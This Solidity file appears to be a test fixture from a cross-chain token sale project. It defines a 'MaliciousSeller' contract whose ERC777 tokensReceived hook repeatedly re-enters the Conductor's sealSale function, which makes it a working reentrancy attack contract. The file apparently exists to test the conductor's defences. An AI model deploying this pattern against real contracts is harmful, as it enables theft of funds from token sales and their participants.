// SPDX-License-Identifier: Apache 2
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "../../icco/conductor/Conductor.sol";
import "../../icco/shared/ICCOStructs.sol";

contract MaliciousSeller is IERC777Recipient {
    address private _owner;
    address private _erc777token;
    address private _conductor;
    uint256 private _wormholeFee;
    uint256 private _saleId;
    uint256 private _numTimes;
    uint256 private _counter;
    
    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    
    constructor () {
        _owner = msg.sender;
        _erc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
    }
    /****************** FUNCTIONS FOR SETTING ************************/
    function setToken(address erc777token) public {
        require(_owner == msg.sender, "Not authorized");
        _erc777token = erc777token;
    }
    function setConductor(address conductor) public {
        require(_owner == msg.sender, "Not authorized");
        _conductor = conductor;
    }
    function setWormholeFee(uint256 wormholeFee) public {
        require(_owner == msg.sender, "Not authorized");
        _wormholeFee = wormholeFee;
    }
    function setSaleId(uint256 saleId) public {
        require(_owner == msg.sender, "Not authorized");
        _saleId = saleId;
    }
    function setNumTimes(uint256 numTimes) public {
        require(_owner == msg.sender, "Not authorized");
        _numTimes = numTimes;
    }
    /*****************************************************************/
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override{
       require(msg.sender == address(_erc777token), "Invalid token");
       
       if (_counter < _numTimes) {
        _counter++;
        Conductor(payable(_conductor)).sealSale{value:_wormholeFee}(_saleId);
       }
       
    }
   receive() external payable {}
}